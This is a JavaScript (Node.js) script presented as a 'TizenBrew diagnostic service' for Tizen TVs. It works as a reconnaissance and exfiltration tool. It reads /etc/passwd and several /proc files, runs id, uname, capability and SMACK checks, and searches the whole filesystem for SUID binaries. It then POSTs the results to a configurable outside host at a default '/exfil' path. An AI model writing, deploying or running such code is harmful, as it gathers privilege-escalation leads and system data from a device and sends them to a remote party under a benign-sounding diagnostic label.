/* TizenBrew diagnostic service, compatible with the TV's Node.js 4.4.3. */
'use strict';

var fs = require('fs');
var http = require('http');
var CONFIG_PATH = '/home/owner/share/tizenbrew-shell-config.json';
var RESULTS_PATH = '/home/owner/share/tizenbrew-shell-results.json';

function readConfig() {
  var path = process.env.TIZENBREW_SHELL_CONFIG || CONFIG_PATH;
  var parsed = JSON.parse(fs.readFileSync(path, 'utf8'));
  if (!parsed.host || !parsed.port) {
    throw new Error('callback config requires host and port');
  }
  return {
    host: String(parsed.host),
    port: Number(parsed.port),
    path: parsed.path ? String(parsed.path) : '/exfil'
  };
}

function readText(path, limit) {
  try {
    return fs.readFileSync(path, 'utf8').slice(0, limit);
  } catch (error) {
    return 'ERROR: ' + error.message;
  }
}

function postResults(config, results) {
  var payload = JSON.stringify(results);
  var request = http.request({
    hostname: config.host,
    port: config.port,
    path: config.path,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, function (response) {
    response.resume();
    console.log('Diagnostic callback returned HTTP ' + response.statusCode);
  });

  request.setTimeout(5000, function () {
    request.abort();
    console.error('Diagnostic callback timed out');
  });
  request.on('error', function (error) {
    console.error('Diagnostic callback failed: ' + error.message);
  });
  request.end(payload);
}

function finish(config, results) {
  try {
    fs.writeFileSync(RESULTS_PATH, JSON.stringify(results, null, 2));
  } catch (error) {
    results.results_file_error = error.message;
  }
  postResults(config, results);
}

function runCommands(config, results, commands, index, exec) {
  if (index >= commands.length) {
    finish(config, results);
    return;
  }

  var command = commands[index];
  exec(command.command, { timeout: 10000, maxBuffer: 65536 }, function (error, stdout, stderr) {
    results.commands[command.name] = {
      error: error ? error.message : null,
      stdout: String(stdout || '').slice(0, 8192),
      stderr: String(stderr || '').slice(0, 4096)
    };
    runCommands(config, results, commands, index + 1, exec);
  });
}

function main() {
  var config;
  try {
    config = readConfig();
  } catch (error) {
    console.error('Diagnostic configuration failed: ' + error.message);
    return;
  }

  var results = {
    marker: 'tizenbrew-diagnostic-v1',
    timestamp: new Date().toISOString(),
    process: {
      uid: process.getuid ? process.getuid() : null,
      gid: process.getgid ? process.getgid() : null,
      pid: process.pid,
      version: process.version,
      arch: process.arch,
      platform: process.platform,
      cwd: process.cwd()
    },
    files: {
      passwd: readText('/etc/passwd', 4096),
      proc_self_status: readText('/proc/self/status', 8192),
      proc_version: readText('/proc/version', 4096),
      proc_mounts: readText('/proc/mounts', 8192)
    },
    tizen: {},
    commands: {}
  };

  try {
    results.tizen.platform_version = tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version');
  } catch (error) {
    results.tizen.error = error.message;
  }

  var childProcess;
  try {
    childProcess = require('child_process');
    results.child_process = 'available';
  } catch (error) {
    results.child_process = 'unavailable: ' + error.message;
    finish(config, results);
    return;
  }

  runCommands(config, results, [
    { name: 'id', command: 'id' },
    { name: 'uname', command: 'uname -a' },
    { name: 'capabilities', command: "grep '^Cap' /proc/self/status 2>/dev/null" },
    { name: 'smack', command: 'ls -la /sys/fs/smack /sys/fs/smackfs 2>/dev/null' },
    { name: 'suid', command: 'find / -perm -4000 -type f 2>/dev/null | head -50' }
  ], 0, childProcess.exec);
}

main();
